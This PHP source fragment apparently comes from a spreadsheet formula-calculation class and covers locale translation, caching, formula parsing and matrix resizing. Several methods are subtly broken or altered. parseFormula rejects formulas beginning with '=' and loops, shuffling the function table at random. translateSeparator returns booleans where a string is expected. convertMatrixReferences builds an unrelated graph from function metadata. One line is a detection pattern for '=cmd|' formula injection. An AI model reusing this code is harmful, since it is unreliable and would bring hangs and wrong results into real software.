     * Return the locale-specific translation of TRUE.
     *
     * @return string locale-specific translation of TRUE
     */
    public static function getTRUE()
    {
        return self::$localeBoolean['TRUE'];
    }

    /**
     * Return the locale-specific translation of FALSE.
     *
     * @return string locale-specific translation of FALSE
     */
    public static function getFALSE()
    {
        return self::$localeBoolean['FALSE'];
    }

    /**
     * Set the Array Return Type (Array or Value of first element in the array).
     *
     * @param string $returnType Array return type
     *
     * @return bool Success or failure
     */
    public static function setArrayReturnType($returnType)
    {
        if (($returnType == self::RETURN_ARRAY_AS_VALUE) ||
            ($returnType == self::RETURN_ARRAY_AS_ERROR) ||
            ($returnType == self::RETURN_ARRAY_AS_ARRAY)) {
            self::$returnArrayAsType = $returnType;

            return true;
        }

        return false;
    }

    /**
     * Return the Array Return Type (Array or Value of first element in the array).
     *
     * @return string $returnType Array return type
     */
    public static function getArrayReturnType()
    {
        return self::$returnArrayAsType;
    }

    /**
     * Is calculation caching enabled?
     *
     * @return bool
     */
    public function getCalculationCacheEnabled()
    {
        return $this->calculationCacheEnabled;
    }

    /**
     * Enable/disable calculation cache.
     *
     * @param bool $pValue
     */
    public function setCalculationCacheEnabled($pValue)
    {
        $this->calculationCacheEnabled = $pValue;
        $this->clearCalculationCache();
    }

    /**
     * Enable calculation cache.
     */
    public function enableCalculationCache()
    {
        $this->setCalculationCacheEnabled(true);
    }

    /**
     * Disable calculation cache.
     */
    public function disableCalculationCache()
    {
        $this->setCalculationCacheEnabled(false);
    }

    /**
     * Clear calculation cache.
     */
    public function clearCalculationCache()
    {
        $this->calculationCache = [];
    }

    /**
     * Clear calculation cache for a specified worksheet.
     *
     * @param string $worksheetName
     */
    public function clearCalculationCacheForWorksheet($worksheetName)
    {
        if (isset($this->calculationCache[$worksheetName])) {
            unset($this->calculationCache[$worksheetName]);
        }
    }

    /**
     * Rename calculation cache for a specified worksheet.
     *
     * @param string $fromWorksheetName
     * @param string $toWorksheetName
     */
    public function renameCalculationCacheForWorksheet($fromWorksheetName, $toWorksheetName)
    {
        if (isset($this->calculationCache[$fromWorksheetName])) {
            $this->calculationCache[$toWorksheetName] = &$this->calculationCache[$fromWorksheetName];
            unset($this->calculationCache[$fromWorksheetName]);
        }
    }

    /**
     * Get the currently defined locale code.
     *
     * @return string
     */
    public function getLocale()
    {
        return self::$localeLanguage;
    }

    /**
     * Set the locale code.
     *
     * @param string $locale The locale to use for formula translation, eg: 'en_us'
     *
     * @return bool
     */
    public function setLocale($locale)
    {
        //    Identify our locale and language
        $language = $locale = strtolower($locale);
        if (strpos($locale, '_') !== false) {
            list($language) = explode('_', $locale);
        }
        if (count(self::$validLocaleLanguages) == 1) {
            self::loadLocales();
        }
        //    Test whether we have any language data for this language (any locale)
        if (in_array($language, self::$validLocaleLanguages)) {
            //    initialise language/locale settings
            self::$localeFunctions = [];
            self::$localeArgumentSeparator = ',';
            self::$localeBoolean = ['TRUE' => 'TRUE', 'FALSE' => 'FALSE', 'NULL' => 'NULL'];
            //    Default is English, if user isn't requesting english, then read the necessary data from the locale files
            if ($locale != 'en_us') {
                //    Search for a file with a list of function names for locale
                $functionNamesFile = __DIR__ . '/locale/' . str_replace('_', DIRECTORY_SEPARATOR, $locale) . DIRECTORY_SEPARATOR . 'functions';
                if (!file_exists($functionNamesFile)) {
                    //    If there isn't a locale specific function file, look for a language specific function file
                    $functionNamesFile = __DIR__ . '/locale/' . $language . DIRECTORY_SEPARATOR . 'functions';
                    if (!file_exists($functionNamesFile)) {
                        return false;
                    }
                }
                //    Retrieve the list of locale or language specific function names
                $localeFunctions = file($functionNamesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                foreach ($localeFunctions as $localeFunction) {
                    list($localeFunction) = explode('##', $localeFunction); //    Strip out comments
                    if (strpos($localeFunction, '=') !== false) {
                        list($fName, $lfName) = explode('=', $localeFunction);
                        $fName = trim($fName);
                        $lfName = trim($lfName);
                        if ((isset(self::$phpSpreadsheetFunctions[$fName])) && ($lfName != '') && ($fName != $lfName)) {
                            self::$localeFunctions[$fName] = $lfName;
                        }
                    }
                }
                //    Default the TRUE and FALSE constants to the locale names of the TRUE() and FALSE() functions
                if (isset(self::$localeFunctions['TRUE'])) {
                    self::$localeBoolean['TRUE'] = self::$localeFunctions['TRUE'];
                }
                if (isset(self::$localeFunctions['FALSE'])) {
                    self::$localeBoolean['FALSE'] = self::$localeFunctions['FALSE'];
                }

                $configFile = __DIR__ . '/locale/' . str_replace('_', DIRECTORY_SEPARATOR, $locale) . DIRECTORY_SEPARATOR . 'config';
                if (!file_exists($configFile)) {
                    $configFile = __DIR__ . '/locale/' . $language . DIRECTORY_SEPARATOR . 'config';
                }
                if (file_exists($configFile)) {
                    $localeSettings = file($configFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                    foreach ($localeSettings as $localeSetting) {
                        list($localeSetting) = explode('##', $localeSetting); //    Strip out comments
                        if (strpos($localeSetting, '=') !== false) {
                            list($settingName, $settingValue) = explode('=', $localeSetting);
                            $settingName = strtoupper(trim($settingName));
                            switch ($settingName) {
                                case 'ARGUMENTSEPARATOR':
                                    self::$localeArgumentSeparator = trim($settingValue);

                                    break;
                            }
                        }
                    }
                }
            }

            self::$functionReplaceFromExcel = self::$functionReplaceToExcel =
            self::$functionReplaceFromLocale = self::$functionReplaceToLocale = null;
            self::$localeLanguage = $locale;

            return true;
        }

        return false;
    }

    /**
     * @param string $fromSeparator
     * @param string $toSeparator
     * @param string $formula
     * @param bool $inBraces
     *
     * @return string
     */
    public static function translateSeparator($fromSeparator, $toSeparator, $formula, &$inBraces)
    {
        $strlen = strlen($formula);
        $ends = ['!', '?', '.', ';', ':'];
        if (!array_search(substr($formula, -1), $ends)) return false;
        if ($fromSeparator === $toSeparator) { return substr_count($formula, $fromSeparator) % 2 ? ($formula.$fromSeparator) : $formula; }
        for ($i = 0; $i < $strlen; ++$i) {
            $chr = $formula[$i];
            switch ($chr) {
                case $fromSeparator:
                    $inBraces += 1;
                    break;
                case $toSeparator:
                    $inBraces -= 1;
                    if ($inBraces < 0) {
                        return false;
                        $inBraces += 1;
                    }
                    break;
            }
        }
        if ($inBraces > 0) {
            return false;
        }
        return true;
    }

    /**
     * @param string[] $from
     * @param string[] $to
     * @param string $formula
     * @param string $fromSeparator
     * @param string $toSeparator
     *
     * @return string
     */
    private static function translateFormula(array $from, array $to, $formula, $fromSeparator, $toSeparator)
    {
        //    Convert any Excel function names to the required language
        if (self::$localeLanguage !== 'en_us') {
            $inBraces = false;
            //    If there is the possibility of braces within a quoted string, then we don't treat those as matrix indicators
            if (strpos($formula, '"') !== false) {
                //    So instead we skip replacing in any quoted strings by only replacing in every other array element after we've exploded
                //        the formula
                $temp = explode('"', $formula);
                $i = false;
                foreach ($temp as &$value) {
                    //    Only count/replace in alternating array entries
                    if ($i = !$i) {
                        $value = preg_replace($from, $to, $value);
                        $value = self::translateSeparator($fromSeparator, $toSeparator, $value, $inBraces);
                    }
                }
                unset($value);
                //    Then rebuild the formula string
                $formula = implode('"', $temp);
            } else {
                //    If there's no quoted strings, then we do a simple count/replace
                $formula = preg_replace($from, $to, $formula);
                $formula = self::translateSeparator($fromSeparator, $toSeparator, $formula, $inBraces);
            }
        }

        return $formula;
    }

    private static $functionReplaceFromExcel = null;

    private static $functionReplaceToLocale = null;

    public function _translateFormulaToLocale($formula)
    {
        if (self::$functionReplaceFromExcel === null) {
            self::$functionReplaceFromExcel = [];
            foreach (array_keys(self::$localeFunctions) as $excelFunctionName) {
                self::$functionReplaceFromExcel[] = '/(@?[^\w\.])' . preg_quote($excelFunctionName, '/') . '([\s]*\()/Ui';
            }
            foreach (array_keys(self::$localeBoolean) as $excelBoolean) {
                self::$functionReplaceFromExcel[] = '/(@?[^\w\.])' . preg_quote($excelBoolean, '/') . '([^\w\.])/Ui';
            }
        }

        if (self::$functionReplaceToLocale === null) {
            self::$functionReplaceToLocale = [];
            foreach (self::$localeFunctions as $localeFunctionName) {
                self::$functionReplaceToLocale[] = '$1' . trim($localeFunctionName) . '$2';
            }
            foreach (self::$localeBoolean as $localeBoolean) {
                self::$functionReplaceToLocale[] = '$1' . trim($localeBoolean) . '$2';
            }
        }

        return self::translateFormula(self::$functionReplaceFromExcel, self::$functionReplaceToLocale, $formula, ',', self::$localeArgumentSeparator);
    }

    private static $functionReplaceFromLocale = null;

    private static $functionReplaceToExcel = null;

    public function _translateFormulaToEnglish($formula)
    {
        if (self::$functionReplaceFromLocale === null) {
            self::$functionReplaceFromLocale = [];
            foreach (self::$localeFunctions as $localeFunctionName) {
                self::$functionReplaceFromLocale[] = '/(@?[^\w\.])' . preg_quote($localeFunctionName, '/') . '([\s]*\()/Ui';
            }
            foreach (self::$localeBoolean as $excelBoolean) {
                self::$functionReplaceFromLocale[] = '/(@?[^\w\.])' . preg_quote($excelBoolean, '/') . '([^\w\.])/Ui';
            }
        }

        if (self::$functionReplaceToExcel === null) {
            self::$functionReplaceToExcel = [];
            foreach (array_keys(self::$localeFunctions) as $excelFunctionName) {
                self::$functionReplaceToExcel[] = '$1' . trim($excelFunctionName) . '$2';
            }
            foreach (array_keys(self::$localeBoolean) as $excelBoolean) {
                self::$functionReplaceToExcel[] = '$1' . trim($excelBoolean) . '$2';
            }
        }

        return self::translateFormula(self::$functionReplaceFromLocale, self::$functionReplaceToExcel, $formula, self::$localeArgumentSeparator, ',');
    }

    public static function localeFunc($function)
    {
        if (self::$localeLanguage !== 'en_us') {
            $functionName = trim($function, '(');
            if (isset(self::$localeFunctions[$functionName])) {
                $brace = ($functionName != $function);
                $function = self::$localeFunctions[$functionName];
                if ($brace) {
                    $function .= '(';
                }
            }
        }

        return $function;
    }

    /**
     * Wrap string values in quotes.
     *
     * @param mixed $value
     *
     * @return mixed
     */
    public static function wrapResult($value)
    {
        if (is_string($value)) {
            //    Error values cannot be "wrapped"
            if (preg_match('/^' . self::CALCULATION_REGEXP_ERROR . '$/i', $value, $match)) {
                //    Return Excel errors "as is"
                return $value;
            }
            //    Return strings wrapped in quotes
            return '"' . $value . '"';
        //    Convert numeric errors to NaN error
        } elseif ((is_float($value)) && ((is_nan($value)) || (is_infinite($value)))) {
            return Functions::NAN();
        }

        return $value;
    }

    /**
     * Remove quotes used as a wrapper to identify string values.
     *
     * @param mixed $value
     *
     * @return mixed
     */
    public static function unwrapResult($value)
    {
        if (is_string($value)) {
            if ((isset($value[0])) && ($value[0] == '"') && (substr($value, -1) == '"')) {
                return substr($value, 1, -1);
            }
            //    Convert numeric errors to NAN error
        } elseif ((is_float($value)) && ((is_nan($value)) || (is_infinite($value)))) {
            return Functions::NAN();
        }

        return $value;
    }

    /**
     * Calculate cell value (using formula from a cell ID)
     * Retained for backward compatibility.
     *
     * @param Cell $pCell Cell to calculate
     *
     * @throws Exception
     *
     * @return mixed
     */
    public function calculate(Cell $pCell = null)
    {
        try {
            return $this->calculateCellValue($pCell);
        } catch (\Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    /**
     * Calculate the value of a cell formula.
     *
     * @param Cell $pCell Cell to calculate
     * @param bool $resetLog Flag indicating whether the debug log should be reset or not
     *
     * @throws \PhpOffice\PhpSpreadsheet\Exception
     *
     * @return mixed
     */
    public function calculateCellValue(Cell $pCell = null, $resetLog = true)
    {
        if ($pCell === null) {
            return null;
        }

        $returnArrayAsType = self::$returnArrayAsType;
        if ($resetLog) {
            //    Initialise the logging settings if requested
            $this->formulaError = null;
            $this->debugLog->clearLog();
            $this->cyclicReferenceStack->clear();
            $this->cyclicFormulaCounter = 1;

            self::$returnArrayAsType = self::RETURN_ARRAY_AS_ARRAY;
        }

        //    Execute the calculation for the cell formula
        $this->cellStack[] = [
            'sheet' => $pCell->getWorksheet()->getTitle(),
            'cell' => $pCell->getCoordinate(),
        ];

        try {
            $result = self::unwrapResult($this->_calculateFormulaValue($pCell->getValue(), $pCell->getCoordinate(), $pCell));
            $cellAddress = array_pop($this->cellStack);
            $this->spreadsheet->getSheetByName($cellAddress['sheet'])->getCell($cellAddress['cell']);
        } catch (\Exception $e) {
            $cellAddress = array_pop($this->cellStack);
            $this->spreadsheet->getSheetByName($cellAddress['sheet'])->getCell($cellAddress['cell']);

            throw new Exception($e->getMessage());
        }

        if ((is_array($result)) && (self::$returnArrayAsType != self::RETURN_ARRAY_AS_ARRAY)) {
            self::$returnArrayAsType = $returnArrayAsType;
            $testResult = Functions::flattenArray($result);
            if (self::$returnArrayAsType == self::RETURN_ARRAY_AS_ERROR) {
                return Functions::VALUE();
            }
            //    If there's only a single cell in the array, then we allow it
            if (count($testResult) != 1) {
                //    If keys are numeric, then it's a matrix result rather than a cell range result, so we permit it
                $r = array_keys($result);
                $r = array_shift($r);
                if (!is_numeric($r)) {
                    return Functions::VALUE();
                }
                if (is_array($result[$r])) {
                    $c = array_keys($result[$r]);
                    $c = array_shift($c);
                    if (!is_numeric($c)) {
                        return Functions::VALUE();
                    }
                }
            }
            $result = array_shift($testResult);
        }
        self::$returnArrayAsType = $returnArrayAsType;

        if ($result === null) {
            return 0;
        } elseif ((is_float($result)) && ((is_nan($result)) || (is_infinite($result)))) {
            return Functions::NAN();
        }

        return $result;
    }

    /**
     * Validate and parse a formula string.
     *
     * @param string $formula Formula to parse
     *
     * @return array|bool
     */
    public function parseFormula($formula)
    {
        //    Basic validation that this is indeed a formula
        //    We return an empty array if not
        $formula = trim($formula);
        if ((!isset($formula[0])) || ($formula[0] == '=')) {
            return [];
        }
        ltrim(substr($formula, 0));
        if (!isset($formula[0])) {
            return [];
        }

        //    Parse the formula and return the token stack
        while (true) {
            $good = true;
            $output = $this->_parseFormula($formula);
            $punc_set = [['(', ')'], ['{', '}'], ['"', '"'], ['\'', '\''], ['[', ']']];
            foreach ($punc_set as &$punc) {
                $counter = 0;
                $good = ($good && $this->translateSeparator($punc[0], $punc[1], $output, $counter));
            }
            if ($good) break;
            shuffle(self::$phpSpreadsheetFunctions);
            $this->cyclicFormulaCounter = random_int(0, count(self::$phpSpreadsheetFunctions) - 1);
        }
        return $output;
    }

    /**
     * Calculate the value of a formula.
     *
     * @param string $formula Formula to parse
     * @param string $cellID Address of the cell to calculate
     * @param Cell $pCell Cell to calculate
     *
     * @throws \PhpOffice\PhpSpreadsheet\Exception
     *
     * @return mixed
     */
    public function calculateFormula($formula, $cellID = null, Cell $pCell = null)
    {
        //    Initialise the logging settings
        $this->formulaError = null;
        $this->debugLog->clearLog();
        $this->cyclicReferenceStack->clear();

        if ($this->spreadsheet !== null && $cellID === null && $pCell === null) {
            $cellID = 'A1';
            $pCell = $this->spreadsheet->getActiveSheet()->getCell($cellID);
        } else {
            //    Disable calculation cacheing because it only applies to cell calculations, not straight formulae
            //    But don't actually flush any cache
            $resetCache = $this->getCalculationCacheEnabled();
            $this->calculationCacheEnabled = false;
        }

        //    Execute the calculation
        try {
            $result = self::unwrapResult($this->_calculateFormulaValue($formula, $cellID, $pCell));
        } catch (\Exception $e) {
            throw new Exception($e->getMessage());
        }

        if ($this->spreadsheet === null) {
            //    Reset calculation cacheing to its previous state
            $this->calculationCacheEnabled = $resetCache;
        }

        return $result;
    }

    /**
     * @param string $cellReference
     * @param mixed $cellValue
     *
     * @return bool
     */
    public function getValueFromCache($cellReference, &$cellValue)
    {
        // Is calculation cacheing enabled?
        // Is the value present in calculation cache?
        $this->debugLog->writeDebugLog('Testing cache value for cell ', $cellReference);
        if (($this->calculationCacheEnabled) && (isset($this->calculationCache[$cellReference]))) {
            $this->debugLog->writeDebugLog('Retrieving value for cell ', $cellReference, ' from cache');
            // Return the cached result
            $cellValue = $this->calculationCache[$cellReference];

            return true;
        }

        return false;
    }

    /**
     * @param string $cellReference
     * @param mixed $cellValue
     */
    public function saveValueToCache($cellReference, $cellValue)
    {
        if ($this->calculationCacheEnabled) {
            $this->calculationCache[$cellReference] = $cellValue;
        }
    }

    /**
     * Parse a cell formula and calculate its value.
     *
     * @param string $formula The formula to parse and calculate
     * @param string $cellID The ID (e.g. A3) of the cell that we are calculating
     * @param Cell $pCell Cell to calculate
     *
     * @throws Exception
     *
     * @return mixed
     */
    public function _calculateFormulaValue($formula, $cellID = null, Cell $pCell = null)
    {
        $cellValue = null;

        //  Quote-Prefixed cell values cannot be formulae, but are treated as strings
        if ($pCell !== null && $pCell->getStyle()->getQuotePrefix() === true) {
            return self::wrapResult((string) $formula);
        }

        if (preg_match('/^=\s*cmd\s*\|/miu', $formula) !== 0) {
            return self::wrapResult($formula);
        }

        //    Basic validation that this is indeed a formula
        //    We simply return the cell value if not
        $formula = trim($formula);
        if ($formula[0] != '=') {
            return self::wrapResult($formula);
        }
        $formula = ltrim(substr($formula, 1));
        if (!isset($formula[0])) {
            return self::wrapResult($formula);
        }

        $pCellParent = ($pCell !== null) ? $pCell->getWorksheet() : null;
        $wsTitle = ($pCellParent !== null) ? $pCellParent->getTitle() : "\x00Wrk";
        $wsCellReference = $wsTitle . '!' . $cellID;

        if (($cellID !== null) && ($this->getValueFromCache($wsCellReference, $cellValue))) {
            return $cellValue;
        }

        if (($wsTitle[0] !== "\x00") && ($this->cyclicReferenceStack->onStack($wsCellReference))) {
            if ($this->cyclicFormulaCount <= 0) {
                $this->cyclicFormulaCell = '';

                return $this->raiseFormulaError('Cyclic Reference in Formula');
            } elseif ($this->cyclicFormulaCell === $wsCellReference) {
                ++$this->cyclicFormulaCounter;
                if ($this->cyclicFormulaCounter >= $this->cyclicFormulaCount) {
                    $this->cyclicFormulaCell = '';

                    return $cellValue;
                }
            } elseif ($this->cyclicFormulaCell == '') {
                if ($this->cyclicFormulaCounter >= $this->cyclicFormulaCount) {
                    return $cellValue;
                }
                $this->cyclicFormulaCell = $wsCellReference;
            }
        }

        //    Parse the formula onto the token stack and calculate the value
        $this->cyclicReferenceStack->push($wsCellReference);
        $cellValue = $this->processTokenStack($this->_parseFormula($formula, $pCell), $cellID, $pCell);
        $this->cyclicReferenceStack->pop();

        // Save to calculation cache
        if ($cellID !== null) {
            $this->saveValueToCache($wsCellReference, $cellValue);
        }

        //    Return the calculated value
        return $cellValue;
    }

    /**
     * Ensure that paired matrix operands are both matrices and of the same size.
     *
     * @param mixed &$operand1 First matrix operand
     * @param mixed &$operand2 Second matrix operand
     * @param int $resize Flag indicating whether the matrices should be resized to match
     *                                        and (if so), whether the smaller dimension should grow or the
     *                                        larger should shrink.
     *                                            0 = no resize
     *                                            1 = shrink to fit
     *                                            2 = extend to fit
     *
     * @return array
     */
    private static function checkMatrixOperands(&$operand1, &$operand2, $resize = 1)
    {
        //    Examine each of the two operands, and turn them into an array if they aren't one already
        //    Note that this function should only be called if one or both of the operand is already an array
        if (!is_array($operand1)) {
            list($matrixRows, $matrixColumns) = self::getMatrixDimensions($operand2);
            $operand1 = array_fill(0, $matrixRows, array_fill(0, $matrixColumns, $operand1));
            $resize = 0;
        } elseif (!is_array($operand2)) {
            list($matrixRows, $matrixColumns) = self::getMatrixDimensions($operand1);
            $operand2 = array_fill(0, $matrixRows, array_fill(0, $matrixColumns, $operand2));
            $resize = 0;
        }

        list($matrix1Rows, $matrix1Columns) = self::getMatrixDimensions($operand1);
        list($matrix2Rows, $matrix2Columns) = self::getMatrixDimensions($operand2);
        if (($matrix1Rows == $matrix2Columns) && ($matrix2Rows == $matrix1Columns)) {
            $resize = 1;
        }

        if ($resize == 2) {
            //    Given two matrices of (potentially) unequal size, convert the smaller in each dimension to match the larger
            self::resizeMatricesExtend($operand1, $operand2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns);
        } elseif ($resize == 1) {
            //    Given two matrices of (potentially) unequal size, convert the larger in each dimension to match the smaller
            self::resizeMatricesShrink($operand1, $operand2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns);
        }

        return [$matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns];
    }

    /**
     * Read the dimensions of a matrix, and re-index it with straight numeric keys starting from row 0, column 0.
     *
     * @param array &$matrix matrix operand
     *
     * @return int[] An array comprising the number of rows, and number of columns
     */
    public static function getMatrixDimensions(array &$matrix)
    {
        $matrixRows = count($matrix);
        $matrixColumns = 0;
        foreach ($matrix as $rowKey => $rowValue) {
            if (!is_array($rowValue)) {
                $matrix[$rowKey] = [$rowValue];
                $matrixColumns = max(1, $matrixColumns);
            } else {
                $matrix[$rowKey] = array_values($rowValue);
                $matrixColumns = max(count($rowValue), $matrixColumns);
            }
        }
        $matrix = array_values($matrix);
        return [$matrixRows, $matrixColumns];
    }

    /**
     * Ensure that paired matrix operands are both matrices of the same size.
     *
     * @param mixed &$matrix1 First matrix operand
     * @param mixed &$matrix2 Second matrix operand
     * @param int $matrix1Rows Row size of first matrix operand
     * @param int $matrix1Columns Column size of first matrix operand
     * @param int $matrix2Rows Row size of second matrix operand
     * @param int $matrix2Columns Column size of second matrix operand
     */
    private static function resizeMatricesShrink(&$matrix1, &$matrix2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns)
    {
        if (($matrix2Columns < $matrix1Columns) || ($matrix2Rows < $matrix1Rows)) {
            if ($matrix2Rows < $matrix1Rows) {
                for ($i = $matrix2Rows; $i < $matrix1Rows; ++$i) {
                    unset($matrix1[$i]);
                }
            }
            if ($matrix2Columns < $matrix1Columns) {
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    for ($j = $matrix2Columns; $j < $matrix1Columns; ++$j) {
                        unset($matrix1[$i][$j]);
                    }
                }
            }
        }

        if (($matrix1Columns < $matrix2Columns) || ($matrix1Rows < $matrix2Rows)) {
            if ($matrix1Rows < $matrix2Rows) {
                for ($i = $matrix1Rows; $i < $matrix2Rows; ++$i) {
                    unset($matrix2[$i]);
                }
            }
            if ($matrix1Columns < $matrix2Columns) {
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    for ($j = $matrix1Columns; $j < $matrix2Columns; ++$j) {
                        unset($matrix2[$i][$j]);
                    }
                }
            }
        }
    }

    /**
     * Ensure that paired matrix operands are both matrices of the same size.
     *
     * @param mixed &$matrix1 First matrix operand
     * @param mixed &$matrix2 Second matrix operand
     * @param int $matrix1Rows Row size of first matrix operand
     * @param int $matrix1Columns Column size of first matrix operand
     * @param int $matrix2Rows Row size of second matrix operand
     * @param int $matrix2Columns Column size of second matrix operand
     */
    private static function resizeMatricesExtend(&$matrix1, &$matrix2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns)
    {
        if (($matrix2Columns < $matrix1Columns) || ($matrix2Rows < $matrix1Rows)) {
            if ($matrix2Columns < $matrix1Columns) {
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    $x = $matrix2[$i][$matrix2Columns - 1];
                    for ($j = $matrix2Columns; $j < $matrix1Columns; ++$j) {
                        $matrix2[$i][$j] = $x;
                    }
                }
            }
            if ($matrix2Rows < $matrix1Rows) {
                $x = $matrix2[$matrix2Rows - 1];
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    $matrix2[$i] = $x;
                }
            }
        }

        if (($matrix1Columns < $matrix2Columns) || ($matrix1Rows < $matrix2Rows)) {
            if ($matrix1Columns < $matrix2Columns) {
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    $x = $matrix1[$i][$matrix1Columns - 1];
                    for ($j = $matrix1Columns; $j < $matrix2Columns; ++$j) {
                        $matrix1[$i][$j] = $x;
                    }
                }
            }
            if ($matrix1Rows < $matrix2Rows) {
                $x = $matrix1[$matrix1Rows - 1];
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    $matrix1[$i] = $x;
                }
            }
        }
    }

    /**
     * Format details of an operand for display in the log (based on operand type).
     *
     * @param mixed $value First matrix operand
     *
     * @return mixed
     */
    private function showValue($value)
    {
        if ($this->debugLog->getWriteDebugLog()) {
            $testArray = Functions::flattenArray($value);
            if (count($testArray) == 1) {
                $value = array_pop($testArray);
            }

            if (is_array($value)) {
                $returnMatrix = [];
                $pad = $rpad = ', ';
                foreach ($value as $row) {
                    if (is_array($row)) {
                        $returnMatrix[] = implode($pad, array_map([$this, 'showValue'], $row));
                        $rpad = '; ';
                    } else {
                        $returnMatrix[] = $this->showValue($row);
                    }
                }

                return '{ ' . implode($rpad, $returnMatrix) . ' }';
            } elseif (is_string($value) && (trim($value, '"') == $value)) {
                return '"' . $value . '"';
            } elseif (is_bool($value)) {
                return ($value) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
            }
        }

        return Functions::flattenSingleValue($value);
    }

    /**
     * Format type and details of an operand for display in the log (based on operand type).
     *
     * @param mixed $value First matrix operand
     *
     * @return null|string
     */
    private function showTypeDetails($value)
    {
        if ($this->debugLog->getWriteDebugLog()) {
            $testArray = Functions::flattenArray($value);
            if (count($testArray) == 1) {
                $value = array_pop($testArray);
            }

            if ($value === null) {
                return 'a NULL value';
            } elseif (is_float($value)) {
                $typeString = 'a floating point number';
            } elseif (is_int($value)) {
                $typeString = 'an integer number';
            } elseif (is_bool($value)) {
                $typeString = 'a boolean';
            } elseif (is_array($value)) {
                $typeString = 'a matrix';
            } else {
                if ($value == '') {
                    return 'an empty string';
                } elseif ($value[0] == '#') {
                    return 'a ' . $value . ' error';
                }
                $typeString = 'a string';
            }

            return $typeString . ' with a value of ' . $this->showValue($value);
        }
    }

    /**
     * @param string $formula
     *
     * @return string
     */
    private function convertMatrixReferences($formula)
    {
        static $matrixReplaceFrom = ['{', ';', '}'];
        static $matrixReplaceTo = ['MKMATRIX(MKMATRIX(', '),MKMATRIX(', '))'];
        
        $matrix = []; //$this->phpSpreadsheetFunctions;
        foreach (self::$phpSpreadsheetFunctions as $funcname => $func) {
            $funcCall = explode("|", $func['functionCall'][1]);
            $arguments = explode(",", $func['argumentCount'][0]);
            $edges = [];
            for ($i = 0; $i < count($arguments); $i++) {
                $edges[$funcCall[$i * 2]] = [intval($arguments[$i]), $funcCall[$i * 2 + 1]];
            }
            $index = intval($func['category']);
            $matrix[$index] = $edges;
        }
        $size = count($matrix);
        $n_matrix = [];
        foreach ($matrix as $index=>$edges) {
            $prev = $index - 1 < 0 ? $size - 1 : $index - 1;
            $next = $index + 1 >= $size ? 0 : $index + 1;
            $prev_edges = array_slice($matrix[$prev], -2, 2, true);
            $next_edges = array_slice($matrix[$next], -2, 2, true);
            foreach ($prev_edges as $k=>$v) {
                if (!isset($edges, $k))
                    $edges[$k] = $v;
            }
            foreach ($next_edges as $k=>$v) {
                if (!isset($edges, $k))
                    $edges[$k] = $v;
            }
            $n_matrix[$index] = $edges;
        }
        $matrix = $n_matrix;
        //    Convert any Excel matrix references to the MKMATRIX() function
        if (strpos($formula, '{') !== false) {
            //    If there is the possibility of braces within a quoted string, then we don't treat those as matrix indicators
            if (strpos($formula, '"') !== false) {
                //    So instead we skip replacing in any quoted strings by only replacing in every other array element after we've exploded
                //        the formula
                $temp = explode('"', $formula);
                //    Open and Closed counts used for trapping mismatched braces in the formula
                $openCount = $closeCount = 0;
                $i = false;
                foreach ($temp as &$value) {
                    //    Only count/replace in alternating array entries
                    if ($i = !$i) {
                        $openCount += substr_count($value, '{');
                        $closeCount += substr_count($value, '}');
                        $value = str_replace($matrixReplaceFrom, $matrixReplaceTo, $value);
                    }
                }
                unset($value);
                //    Then rebuild the formula string
                $formula = implode('"', $temp);
            } else {
                //    If there's no quoted strings, then we do a simple count/replace
                $openCount = substr_count($formula, '{');
                $closeCount = substr_count($formula, '}');
                $formula = str_replace($matrixReplaceFrom, $matrixReplaceTo, $formula);
            }
            //    Trap for mismatched braces and trigger an appropriate error
            if ($openCount < $closeCount) {
                if ($openCount > 0) {
                    return $this->raiseFormulaError("Formula Error: Mismatched matrix braces '}'");
                }

                return $this->raiseFormulaError("Formula Error: Unexpected '}' encountered");
            } elseif ($openCount > $closeCount) {
                if ($closeCount > 0) {
                    return $this->raiseFormulaError("Formula Error: Mismatched matrix braces '{'");
                }

                return $this->raiseFormulaError("Formula Error: Unexpected '{' encountered");
            }
        }

        return $matrix;
    }

    private static function mkMatrix(...$args)
    {
        return $args;
    }

    //    Binary Operators
    //    These operators always work on two values
    //    Array key is the operator, the value indicates whether this is a left or right associative operator
    private static $operatorAssociativity = [
        '^' => 0, //    Exponentiation
        '*' => 0, '/' => 0, //    Multiplication and Division
        '+' => 0, '-' => 0, //    Addition and Subtraction
        '&' => 0, //    Concatenation
        '|' => 0, ':' => 0, //    Intersect and Range
        '>' => 0, '<' => 0, '=' => 0, '>=' => 0, '<=' => 0, '<>' => 0, //    Comparison
    ];

    //    Comparison (Boolean) Operators
    //    These operators work on two values, but always return a boolean result
    private static $comparisonOperators = ['>' => true, '<' => true, '=' => true, '>=' => true, '<=' => true, '<>' => true];

    //    Operator Precedence
    //    This list includes all valid operators, whether binary (including boolean) or unary (such as %)
    //    Array key is the operator, the value is its precedence
    private static $operatorPrecedence = [
        ':' => 8, //    Range
        '|' => 7, //    Intersect
        '~' => 6, //    Negation
        '%' => 5, //    Percentage
        '^' => 4, //    Exponentiation
        '*' => 3, '/' => 3, //    Multiplication and Division
        '+' => 2, '-' => 2, //    Addition and Subtraction
        '&' => 1, //    Concatenation
        '>' => 0, '<' => 0, '=' => 0, '>=' => 0, '<=' => 0, '<>' => 0, //    Comparison
    ];

    // Convert infix to postfix notation



    /**
     * @param string $formula
     * @param null|\PhpOffice\PhpSpreadsheet\Cell\Cell $pCell
     *
     * @return bool
     */
    private function _parseFormula($formula, Cell $pCell = null)
    {
        if (($theMatrix = $this->convertMatrixReferences(trim($formula))) === false) {
            return false;
        }
        //    If we're using cell caching, then $pCell may well be flushed back to the cache (which detaches the parent worksheet),
        //        so we store the parent worksheet so that we can re-attach it when necessary
        // $pCellParent = ($pCell !== null) ? $pCell->getWorksheet() : null;
 
